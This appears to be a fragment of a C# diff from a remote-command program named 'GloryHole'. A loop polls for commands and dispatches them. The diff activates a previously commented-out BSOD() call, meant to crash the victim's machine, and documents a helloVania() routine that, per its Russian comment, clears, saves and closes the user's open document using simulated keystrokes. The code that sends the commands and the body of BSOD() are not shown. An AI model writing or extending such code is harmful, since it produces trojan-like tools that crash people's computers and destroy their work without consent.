@@ -56,7 +56,7 @@ namespace GloryHole
                                     WriteText(cmd.text);
                                     break;
                                 case (CommandTypes.BSOD):/*Бдос вызвать нада */
-                                    //BSOD();
+                                    BSOD();
                                     break;
                             }
                         }
@@ -69,9 +69,11 @@ namespace GloryHole
                     }
                 Thread.Sleep(500);
             }
-        }//sda
+        }
 
-
+        /// <summary>
+        /// Чистит, сохраняет и закрывает документ
+        /// </summary>
         public static void helloVania()
         {
             SendKeys.SendWait("^{a}");
